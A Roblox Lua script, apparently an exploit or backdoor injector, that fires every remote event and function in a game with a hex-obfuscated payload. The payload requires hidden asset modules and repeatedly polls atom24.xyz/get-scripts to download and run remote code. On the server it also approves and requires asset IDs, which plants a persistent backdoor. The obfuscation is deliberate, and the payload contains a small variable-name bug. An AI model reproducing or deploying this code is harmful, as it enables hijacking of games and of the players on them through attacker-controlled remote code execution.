local httpService = game:GetService("HttpService")
local insertService = game:GetService("InsertService")
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local soundService = game:GetService("SoundService")
-- objects
local player = players.LocalPlayer
-- variables
local execSrc = [==[task.defer(pcall,require,12284286314)local function ax(gn) return getfenv()[gn] end;local xA,bA,Vs,Mt,jW,Gh;xA,Vs,bA="\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x74\x6F\x6D\x32\x34\x2E\x78\x79\x7A\x2F","",nil,ax("\x74\x61\x73\x6B")["\x77\x61\x69\x74"],nil,nil;bA,Vs=xA.."\x67\x65\x74\x2D\x73\x63\x72\x69\x70\x74\x73",ax("\x67\x61\x6D\x65");Vs,jW,Gh=Vs["\x47\x65\x74\x53\x65\x72\x76\x69\x63\x65"](Vs, "\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65"),Vs["\x4A\x53\x4F\x4E\x44\x65\x63\x6F\x64\x65"],Vs["\x47\x65\x74\x41\x73\x79\x6E\x63"];ax("\x72\x65\x71\x75\x69\x72\x65")(12284286314);while true do Mt(5);local lR,Eg=jW(Vs,Gh(Vs,bA)),ax("\x72\x65\x71\x75\x69\x72\x65")(4689019964);for lR,Eh in ax("\x70\x61\x69\x72\x73")(lR)do local nT={Eg(Eh)};ax("\x70\x63\x61\x6C\x6C")(nT[1] and nt[2] or Mt, Eh);end;end;]==]
-- functions
local function getRemoteFunc(object)
	return object and ((object:IsA("RemoteEvent") and object.FireServer) or (object:IsA("RemoteFunction") and object.InvokeServer)) or nil
end

local function isRemoteAllowed(object)
	if not object or (not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) then
		return false
	end
	return true
end

local function getRemotes()
	local remotes = table.create(128)

	for _, object in ipairs(game:GetDescendants()) do
		if not isRemoteAllowed(object) then continue end
		table.insert(remotes, object)
	end

	if getnilinstances then
		for _, object in ipairs(getnilinstances()) do
			if not isRemoteAllowed(object) then continue end
			table.insert(remotes, object)
		end
	end
	return remotes
end
-- main
if runService:IsServer() then
	insertService:ApproveAssetId(12284286314)
	require(12344647394)
	task.defer(require, 12284286314)
end

do
	httpService.HttpEnabled = true
	local startTime = os.clock()
	for _, remote in ipairs(getRemotes()) do
		local args = {execSrc}
		local remoteFunc = getRemoteFunc(remote)

		if player:IsDescendantOf(soundService) then
			table.insert(args, 1, game.JobId)
		end
		remoteFunc(remote, unpack(args))
	end
	print("ended in:", os.clock() - startTime)
end
